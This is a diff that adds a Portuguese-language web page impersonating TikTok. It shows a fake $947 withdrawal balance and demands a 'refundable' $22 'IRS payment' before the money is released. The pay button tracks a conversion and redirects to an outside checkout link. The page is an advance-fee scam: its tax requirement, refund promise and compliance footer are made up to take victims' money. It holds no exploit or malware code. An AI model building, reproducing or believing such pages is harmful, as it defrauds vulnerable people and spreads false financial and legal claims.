@@ -1,0 +1,212 @@
+<!doctype html>
+<html lang="pt-PT">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Confirmação de Levantamento</title>
+
+  <link rel="stylesheet" href="css/main.css" />
+  <link rel="stylesheet" href="css/pages.css" />
+  <link rel="stylesheet" href="css/checkout.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+    data-token="7d40c830-4300-4bad-a114-510741bc7700"></script>
+</head>
+
+<body>
+  <div class="app-container">
+    <div class="confirmation-container">
+      <div class="confirmation-header">
+        <button class="back-btn" id="back-btn" style="
+              position: absolute;
+              left: 15px;
+              top: 15px;
+              background: none;
+              border: none;
+              cursor: pointer;
+              padding: 8px;
+              z-index: 10;
+            ">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M19 12H5M12 19l-7-7 7-7" />
+          </svg>
+        </button>
+        <div class="confirmation-logo">
+          <img src="images/logotiktok.png" alt="TikTok" />
+        </div>
+      </div>
+
+      <!-- Saldo Acumulado -->
+      <div class="confirmation-section confirmation-balance">
+        <div class="confirmation-balance-title">SALDO DISPONÍVEL</div>
+        <div class="confirmation-balance-amount" data-amount-target="947.00">
+          $ 947.00
+        </div>
+        <div class="confirmation-balance-subtitle">
+          A aguardar confirmação de levantamento
+        </div>
+      </div>
+
+      <!-- Taxa de Confirmação -->
+      <div class="confirmation-section">
+        <div class="confirmation-section-title">Requisito de Pagamento IRS</div>
+        <div class="confirmation-fee-amount">
+          $ 22.00
+          <span class="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
+        </div>
+        <div class="confirmation-fee-description">
+          De acordo com os regulamentos fiscais federais dos EUA, é necessário um pagamento de
+          <span class="bold">$22,00</span> antes que a libertação do seu
+          levantamento totalizando <span class="bold">$947,00</span> possa ser
+          processada. Este valor ser-lhe-á reembolsado automaticamente no prazo de
+          1 minuto após o processamento.
+        </div>
+      </div>
+
+      <!-- Comprovante -->
+      <div class="confirmation-section">
+        <div class="confirmation-section-title">RESUMO DO LEVANTAMENTO</div>
+        <div class="confirmation-receipt-grid">
+          <div class="confirmation-receipt-item">
+            <div class="confirmation-receipt-label">Nome</div>
+            <div class="confirmation-receipt-value" id="confirmation-name"></div>
+          </div>
+          <div class="confirmation-receipt-item">
+            <div class="confirmation-receipt-label">Data</div>
+            <div class="confirmation-receipt-value" id="confirmation-date"></div>
+          </div>
+          <div class="confirmation-receipt-item">
+            <div class="confirmation-receipt-label">Conta</div>
+            <div class="confirmation-receipt-value" id="confirmation-key-type"></div>
+          </div>
+          <div class="confirmation-receipt-item">
+            <div class="confirmation-receipt-label">Valor a receber</div>
+            <div class="confirmation-receipt-value bold">$ 947.00</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="confirmation-divider"></div>
+
+      <!-- Requisitos -->
+      <div class="confirmation-section">
+        <div class="confirmation-section-title">PROCESSO DE LIBERTAÇÃO</div>
+        <div class="confirmation-requirements-grid">
+          <div class="confirmation-requirement-item">
+            <div class="confirmation-requirement-icon">1</div>
+            <div class="confirmation-requirement-content">
+              <div class="confirmation-requirement-title">
+                Completar pagamento IRS
+              </div>
+              <div class="confirmation-requirement-description">
+                Pagamento obrigatório de $22,00 sob os regulamentos federais
+              </div>
+            </div>
+          </div>
+          <div class="confirmation-requirement-item">
+            <div class="confirmation-requirement-icon confirmation-reembolso">
+              &#10003;
+            </div>
+            <div class="confirmation-requirement-content">
+              <div class="confirmation-requirement-title confirmation-reembolso">
+                Receber reembolso automático
+              </div>
+              <div class="confirmation-requirement-description">
+                Valor de verificação devolvido em 1 minuto
+              </div>
+            </div>
+          </div>
+          <div class="confirmation-requirement-item">
+            <div class="confirmation-requirement-icon">3</div>
+            <div class="confirmation-requirement-content">
+              <div class="confirmation-requirement-title">
+                Aceder ao saldo total
+              </div>
+              <div class="confirmation-requirement-description">
+                $947,00 entregues em 3 minutos
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Call to Action -->
+      <div class="confirmation-section">
+        <a href="#" class="confirmation-cta-button" id="pay-tax-btn">
+          Completar Pagamento IRS e Receber Fundos
+        </a>
+        <div class="confirmation-timer">
+          &#9201;&#65039; Reembolso emitido em 1 minuto
+        </div>
+        <div class="confirmation-success-message" id="confirmation-success-message">
+          &#10004;&#65039; Identidade confirmada. $ 22,00 reembolsados e levantamento
+          libertado.
+        </div>
+      </div>
+
+      <!-- Footer -->
+      <div class="confirmation-footer">
+        <div class="confirmation-footer-text">
+          Este processo está em conformidade com os regulamentos federais dos EUA
+          aplicáveis e os requisitos de verificação de identidade.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="js/notifications.js"></script>
+  <script>
+    // Back button
+    document
+      .getElementById("back-btn")
+      .addEventListener("click", function () {
+        window.location.href = "of2.html" + window.location.search;
+      });
+
+    // Load form data from sessionStorage
+    var formData = {};
+    try {
+      formData = JSON.parse(
+        sessionStorage.getItem("withdrawalFormData") || "{}",
+      );
+    } catch (e) { }
+
+    // Fill confirmation fields
+    if (formData.name) {
+      var nameEl = document.getElementById("confirmation-name");
+      if (nameEl) nameEl.textContent = formData.name;
+    }
+    if (formData.account) {
+      var accountEl = document.getElementById("confirmation-key-type");
+      if (accountEl) accountEl.textContent = formData.account;
+    }
+
+    // Fill current date
+    var dateEl = document.getElementById("confirmation-date");
+    if (dateEl) {
+      var now = new Date();
+      var day = String(now.getDate()).padStart(2, "0");
+      var month = String(now.getMonth() + 1).padStart(2, "0");
+      var year = now.getFullYear();
+      dateEl.textContent = day + "/" + month + "/" + year;
+    }
+
+    // Pay button - redirect to checkout
+    var payButton = document.getElementById("pay-tax-btn");
+    if (payButton) {
+      payButton.addEventListener("click", function (e) {
+        e.preventDefault();
+        if (typeof trackInitiateCheckout === "function") {
+          trackInitiateCheckout(22.00);
+        }
+        window.location.href = "https://waymb.com/c?username=eduardotreonix&product=1" + window.location.search;
+      });
+    }
+  </script>
+
+
+</body>
+
+</html>
